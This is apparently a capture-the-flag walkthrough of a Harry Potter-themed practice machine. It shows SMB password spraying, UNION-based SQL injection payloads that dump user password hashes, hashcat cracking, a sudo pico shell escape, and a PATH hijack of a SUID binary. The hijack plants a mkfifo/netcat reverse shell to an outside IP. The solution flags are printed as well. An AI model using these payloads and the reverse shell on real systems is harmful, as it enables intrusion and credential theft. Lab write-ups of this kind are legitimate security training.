> Madeye's Castle

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A -p- $IP -oN nmap/initial

```bash
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSmqaAdIPmWjN3e6ubgLXXBGVvX9bKtcNHYD2epO9Fwy4brQNYRBkUxrRp4SJIX26MGxGyE8C5HKzhKdlXCeQS+QF36URayv/joz6UOTFTW3oxsMF6tDYMQy3Zcgh5Xp5yVoNGP84pegTQjXUUxhYSEhb3aCIci8JzPt9JntGuO0d0BQAqEo94K3RCx4/V7AWO1qlUeFF/nUZArwtgHcLFYRJEzonM02wGNHXu1vmSuvm4EF/IQE7UYGmNYlNKqYdaE3EYAThEIiiMrPaE4v21xi1JNNjUIhK9YpTA9kJuYk3bnzpO+u6BLTP2bPCMO4C8742UEc4srW7RmZ3qmoGt
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDhpuUC3UgAeCvRo0UuEgWfXhisGXTVUnFooDdZzvGRS393O/N6Ywk715TOIAbk+o1oC1rba5Cg7DM4hyNtejk=
|   256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnNa6K0GzjKiPdClth/sy8rhOd8KtkuagrRkr4tiATl
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# SMB - Anonymous Login

smbclient -L //$IP

```bash
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
sambashare      Disk      Harry's Important Files
IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
```

smbclient //$IP/sambashare

```bash
spellnames.txt                      N      874  Wed Nov 25 20:06:32 2020
.notes.txt                          H      147  Wed Nov 25 20:19:19 2020
```

# .notes.txt

```
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

Let's use the username Hermonine and try cracking smb with password list spellnames.txt!

crackmapexec smb $IP -u hermoine -p spellnames.txt

```bash
SMB         10.10.7.13      445    HOGWARTZ-CASTLE  [+] \hermoine:avadakedavra
```

# Investigating - Port 80

Looking at source code found some interesting comments!

```
TODO: Virtual hosting is good. 
TODO: Register for hogwartz-castle.thm
````

Adding it to the /etc/hosts file and accessing it gives us a different page now!

# Gobuster

gobuster dir -u http://10.10.7.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q

```bash
/backup               (Status: 301) [Size: 309] [--> http://10.10.7.13/backup/]
```

But couldn't access it!

gobuster dir -u http://hogwartz-castle.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q

```bash
/login                (Status: 405) [Size: 178]
/static               (Status: 301) [Size: 327] [--> http://hogwartz-castle.thm/static/]
/logout               (Status: 302) [Size: 209] [--> http://hogwartz-castle.thm/]
```

We got 3 usernames so far and tried to bruteforce with ssh but no luck. So only left is the login form and tried spellnames.txt for all users still no luck! So tried for SQLi by injection a singlr quites and got 500 internal server error. We have SQLi now let's find the number of columns.

I intercepted the request in Burp and modified the request as follows!

```
user=' union select 1,2-- -&password=harry
user=' union select 1,2-- -&password=harry
user=' union select 1,2,3-- -&password=harry
user=' union select 1,2,3,4-- -&password=harry => Waiting for some time we got a hit! It says Password for 1 is incorrect! 4
```

From the above result we can confirm that column 1 and 4 are vulnerable!

user=' union select 1,2,3,sqlite_version();-- -&password=123

And we got the output!

```json
{"error":"The password for 1 is incorrect! 3.22.0"}
```

Let's move onto table name.

user=' union select 1,2,3,group_concat(tbl_name) from sqlite_master;-- -&password=123

```json
{"error":"The password for 1 is incorrect! users"}
```

Next to find column names I took a look at PayloadAllTheThings and modified it!

user=' union select 1,2,3,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users';-- -&password=123

```json
{"error":"The password for 1 is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)"}
```

We got 4 column names. Let's start with password.

user=' union select 1,2,3,group_concat(password) FROM users;-- -&password=123

```json
{"error":"The password for 1 is incorrect! c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492,b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885,e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54,5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8d,2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b,79d9a8bef57568364cc6b4743f8c017c2dfd8fd6d450d9045ad640ab9815f18a69a4d2418a7998b4208d509d8e8e728c654c429095c16583cbf8660b02689905,e3c663d68c647e37c7170a45214caab9ca9a7d77b1a524c3b85cdaeaa68b2b5e740357de2508142bc915d7a16b97012925c221950fb671dd513848e33c33d22e,d3ccca898369a3f4cf73cbfc8daeeb08346edf688dc9b7b859e435fe36021a6845a75e4eddc7a932e38332f66524bd7876c0c613f620b2030ed2f89965823744,dc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0,6535ee9d2b8d6f2438cf92da5a00724bd2539922c83ca19befedbe57859ceafd6d7b9db83bd83c26a1e070725f6f336e21cb40295ee07d87357c34b6774dd918,93b4f8ce01b44dd25c134d0517a496595b0b081cef6eb625e7eb6662cb12dd69c6437af2ed3a5972be8b05cc14a16f46b5d11f9e27e6550911ed3d0fe656e04d,9a311251255c890692dc84b7d7d66a1eefc5b89804cb74d16ff486927014d97502b2f790fbd7966d19e4fbb03b5eb7565afc9417992fc0c242870ea2fd863d6d,5ed63206a19b036f32851def04e90b8df081071aa8ca9fb35ef71e4daf5e6c6eab3b3fea1b6e50a45a46a7aee86e4327f73a00f48deb8ae2bf752f051563cc8b,87ac9f90f01b4b2ae775a7cb96a8a04d7ab7530282fd76224ee03eecab9114275540e4b6a2c52e890cf11f62aacb965be0c53c48c0e51bf731d046c5c3182aad,88344d6b7724bc0e6e3247d4912fa755a5a91c2276e08610462f6ea005d16fd5e305dfe566e7f1dd1a98afe1abfa38df3d9697cdc47ecbb26ac4d21349d09ba7,7f67af71e8cbb7188dd187b7da2386cc800ab8b863c9d0b2dce87c98a91b5511330a2ad4f7d73592b50a2a26c26970cfbd22f915d1967cd92569dbf5e24ac77e,8c8702dbb6de9829bcd6da8a47ab26308e9db7cb274b354e242a9811390462a51345f5101d7f081d36eea4ec199470162775c32cb1f4a96351dc385711619671,c809b40b7c3c0f095390f3cd96bb13864b7e8fd1670c6b1c05b1e26151be62782b97391b120cb4a8ee1d0c9b8fffaf12b44c9d084ae6041468ad5f12ec3d7a4e,68b519187b9e2552d555cb3e9183711b939f94dfe2f71bda0172ee8402acf074cc0f000611d68d2b8e9502fa7235c8a25d72da50916ad0689e00cb4f47283e9b,7eea93d53fbed3ba8f2fa3d25c5f16fe5eaff1f5371918e0845d2076a2e952a457390ad87d289bf25f9457032f14bb07dcd625d03f2f5ee5c887c09dc7107a66,e49608634f7de91d19e5e1b906e10c5a4a855a4fe32521f310727c9875e823c82b3e0347b32ef49ea44657e60e771d9e326d40ab60ce3a950145f1a7a79d3124,c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab,487daab566431e86172ed68f0836f3221592f91c94059a725d2fdca145f97e6258593929c37d0339ca68614a52f4df61953b930585c4968cedaaa836744c52a6,44b1fbcbcd576b8fd69bf2118a0c2b82ccf8a6a9ef2ae56e8978e6178e55b61d491f6fc152d07f97ca88c6b7532f25b8cd46279e8a2c915550d9176f19245798,a86fa315ce8ed4d8295bf6d0139f23ba80e918a54a132e214c92c76768f27ce002253834190412e33c9af4ea76befa066d5bdeb47363f228c509b812dc5d81df,a1f6e38be4bf9fd307efe4fe05522b8c3a9e37fc2c2930507e48cb5582d81f73814ffb543cef77b4b24a18e70e2670668d1a5b6e0b4cb34af9706890bd06bbc9,01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0,d17604dbb5c92b99fe38648bbe4e0a0780f2f4155d58e7d6eddd38d6eceb62ae81e5e31a0a2105de30ba5504ea9c75175a79ed23cd18abcef0c8317ba693b953,ac67187c4d7e887cbaccc625209a8f7423cb4ad938ec8f50c0aa5002e02507c03930f02fab7fab971fb3f659a03cd224669b0e1d5b5a9098b2def90082dfdbd2,134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdb,afcaf504e02b57f9b904d93ee9c1d2e563d109e1479409d96aa064e8fa1b8ef11c92bae56ddb54972e918e04c942bb3474222f041f80b189aa0efd22f372e802,6487592ed88c043e36f6ace6c8b6c59c13e0004f9751b0c3fdf796b1965c48607ac3cc4256cc0708e77eca8e2df35b668f5844200334300a17826c033b03fe29,af9f594822f37da8ed0de005b940158a0837060d3300be014fe4a12420a09d5ff98883d8502a2aaffd64b05c7b5a39cdeb5c57e3005c3d7e9cadb8bb3ad39ddb,53e7ea6c54bea76f1d905889fbc732d04fa5d7650497d5a27acc7f754e69768078c246a160a3a16c795ab71d4b565cde8fdfbe034a400841c7d6a37bdf1dab0d,11f9cd36ed06f0c166ec34ab06ab47f570a4ec3f69af98a3bb145589e4a221d11a09c785d8d3947490ae4cd6f5b5dc4eb730e4faeca2e1cf9990e35d4b136490,9dc90274aef30d1c017a6dc1d5e3c07c8dd6ae964bcfb95cadc0e75ca5927faa4d72eb01836b613916aea2165430fc7592b5abb19b0d0b2476f7082bfa6fb760,4c968fc8f5b72fd21b50680dcddea130862c8a43721d8d605723778b836bcbbc0672d20a22874af855e113cba8878672b7e6d4fc8bf9e11bc59d5dd73eb9d10e,d4d5f4384c9034cd2c77a6bee5b17a732f028b2a4c00344c220fc0022a1efc0195018ca054772246a8d505617d2e5ed141401a1f32b804d15389b62496b60f24,36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36,8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6"}
```

user=' union select 1,2,3,group_concat(name) FROM users;-- -&password=123

```json
{"error":"The password for 1 is incorrect! Lucas Washington,Harry Turner,Andrea Phillips,Liam Hernandez,Adam Jenkins,Landon Alexander,Kennedy Anderson,Sydney Wright,Aaliyah Sanders,Olivia Murphy,Olivia Ross,Grace Brooks,Jordan White,Diego Baker,Liam Ward,Carlos Barnes,Carlos Lopez,Oliver Gonzalez,Sophie Sanchez,Maya Sanders,Joshua Reed,Aaliyah Allen,Jasmine King,Jonathan Long,Samuel Anderson,Julian Robinson,Gianna Harris,Madelyn Morgan,Ella Garcia,Zoey Gonzales,Abigail Morgan,Joseph Rivera,Elizabeth Cook,Parker Cox,Savannah Torres,Aaliyah Williams,Blake Washington,Claire Miller,Brody Stewart,Kimberly Murphy"}
```

user=' union select 1,2,3,group_concat(notes) FROM users;-- -&password=123

```json
{"error":"The password for 1 is incorrect! contact administrator. Congrats on SQL injection... keep digging,My linux username is my first name, and password uses best64, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging"}
```

user=' union select 1,2,3,group_concat(admin) FROM users;-- -&password=123

```json
{"error":"The password for 1 is incorrect! 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0"}
```

Ok let's save the names first and we also have a user named `Harry Turner`. And also we got a hint at notes. 

```
My linux username is my first name
 and password uses best64
```

So we can concentrate at Harry's hash and looking at the hash it is possibly SHA512. So there is a best64 rule in hashcat for constructing strings!

hashcat -m 1700 -a 0 hash.txt -r /usr/share/hashcat/rules/best64.rule spellnames.txt

```
wingardiumleviosa123
```

We can ssh as Harry! 

# user1.txt

```
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
```

# sudo -l

```bash
User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
```

Looking at GTFO bins we can get a shell!

```bash
^R^X
reset; sh 1>&0 2>&0
bash -i
```

And we are in as hermonine!

# user2.txt

```
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
```

Looking for suid bits.

```
/srv/time-turner/swagger => Let's investigate this
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/fusermount
/bin/su
/bin/ping
/bin/mount
```

Looks like we have to guess a number. Running strings I found `uname` command without proper path. So I tried to abuse it but I have to guess the correct number. 

# Hint: Time is tricky. Can you trick time.

Hmmm! Let's try to execute the binary many times with a script.

```bash
for i in $(seq 1 6) ; do echo 123 | ./swagger ; done

Guess my number: Nope, that is not what I was thinking
I was thinking of 1680396079
Guess my number: Nope, that is not what I was thinking
I was thinking of 1680396079
Guess my number: Nope, that is not what I was thinking
I was thinking of 1680396079
Guess my number: Nope, that is not what I was thinking
I was thinking of 1680396079
Guess my number: Nope, that is not what I was thinking
I was thinking of 1680396079
Guess my number: Nope, that is not what I was thinking
I was thinking of 1680396079
```

And wow we are getting the same number again and again. So let's take advantage of this.

```bash
touch /tmp/uname
chmod +x /tmp/uname
export PATH=/tmp:$PATH
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.130 1234 >/tmp/f " > /tmp/uname
```

We have to pass the number to the binary we have to user grep.

./swagger| grep -oE '[0-9]+' | ./swagger

And yes we got a shell!

# root.txt

```
RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```